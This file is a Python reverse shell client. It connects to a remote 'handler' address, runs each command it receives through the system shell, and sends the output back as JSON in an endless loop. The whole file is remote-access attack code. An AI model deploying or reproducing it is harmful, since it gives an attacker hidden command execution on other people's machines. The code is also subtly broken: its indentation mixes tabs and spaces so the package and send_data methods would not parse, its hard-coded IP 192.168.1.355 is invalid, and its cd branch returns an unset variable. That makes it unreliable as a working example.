import socket, subprocess, os, threading, json

class Shell:
	def __init__(self, handler_ip, handler_port):
		self.handler_ip = handler_ip
		self.handler_port = handler_port
		
		self.comm_socket = socket.socket()

	def connect(self):
		self.comm_socket.connect((self.handler_ip, self.handler_port))
		
	def get_data(self):
		data = self.comm_socket.recv(4096)
		if not data: raise Exception("Handler disconnected")
		return data

        def package(self, data):
            package = {}
            package["cwd"] = os.getcwd()
            package["ip"] = "192.168.1.355"
            package["data"] = data
            return json.dumps(package)


	def send_data(self, data):
	        data_package = self.package(data)
		self.comm_socket.sendall(data_package)
		
	def execute_shell_command(self, command):
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		proc_kill = lambda p: subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=p.pid))
		timer = threading.Timer(60, proc_kill, [proc])
		timer.start()
		out = proc.stdout.read() + proc.stderr.read()
		timer.cancel()
		return out
		
	def change_directory(self, dir):
		os.chdir(dir)
		
	def handle_command(self, data):
		command = data.split()[0]
		try:
			arguments = " ".join(data.split()[1:])
		except IndexError:
			pass
			
		if command == "test":
			output = "test successful"
		elif command == "cd":
			self.change_directory(arguments)
		else:
			output = self.execute_shell_command(command+" "+arguments)
			
		return output
		
		
	def run(self):
		while True:
			data = self.get_data()
			output = self.handle_command(data)
			self.send_data(output)
			
shell = Shell("127.0.0.1", 8080)
shell.connect()
shell.run()
